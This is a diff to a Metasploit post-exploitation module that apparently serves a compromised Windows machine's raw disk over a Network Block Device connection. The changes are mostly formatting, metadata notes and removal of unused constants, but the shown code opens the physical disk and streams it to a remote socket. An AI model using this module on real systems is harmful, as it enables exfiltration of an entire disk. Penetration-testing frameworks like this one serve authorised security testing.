@@ -34,6 +34,11 @@ class MetasploitModule < Msf::Post
               stdapi_railgun_api
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -51,20 +56,24 @@ class MetasploitModule < Msf::Post
     port = datastore['NBDPORT']
     devname = datastore['DEVICE']
 
-    invalid_handle_value = 0xFFFFFFFF
-    invalid_set_file_pointer = 0xFFFFFFFF
     fsctl_allow_extended_dasd_io = 0x00090083
     ioctl_disk_get_drive_geometry_ex = 0x000700A0
 
-    r = client.railgun.kernel32.CreateFileA(devname, 'GENERIC_READ',
-                                            0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_READONLY', 0)
+    r = client.railgun.kernel32.CreateFileA(
+      devname, 'GENERIC_READ',
+      0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_READONLY', 0
+    )
     handle = r['return']
-    r = client.railgun.kernel32.DeviceIoControl(handle, fsctl_allow_extended_dasd_io, nil, 0, 0, 0, 4, nil)
-    ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,
-                                                    '', 0, 200, 200, 4, '')
+    client.railgun.kernel32.DeviceIoControl(handle, fsctl_allow_extended_dasd_io, nil, 0, 0, 0, 4, nil)
+    ioctl = client.railgun.kernel32.DeviceIoControl(
+      handle, ioctl_disk_get_drive_geometry_ex,
+      '', 0, 200, 200, 4, ''
+    )
     if ioctl['GetLastError'] == 6
-      ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,
-                                                      '', 0, 200, 200, 4, '')
+      ioctl = client.railgun.kernel32.DeviceIoControl(
+        handle, ioctl_disk_get_drive_geometry_ex,
+        '', 0, 200, 200, 4, ''
+      )
     end
     geometry = ioctl['lpOutBuffer']
     disk_size = geometry[24, 31].unpack('Q')[0]
@@ -80,7 +89,7 @@ class MetasploitModule < Msf::Post
     rsock.put("\x00\x00\x42\x02\x81\x86\x12\x53")
 
     rsock.put([disk_size].pack('Q').reverse)
-    rsock.put("\x00\x00\x00\x03")  # Read-only
+    rsock.put("\x00\x00\x00\x03") # Read-only
     rsock.put("\x00" * 124)
     print_line('Sent negotiation')
 
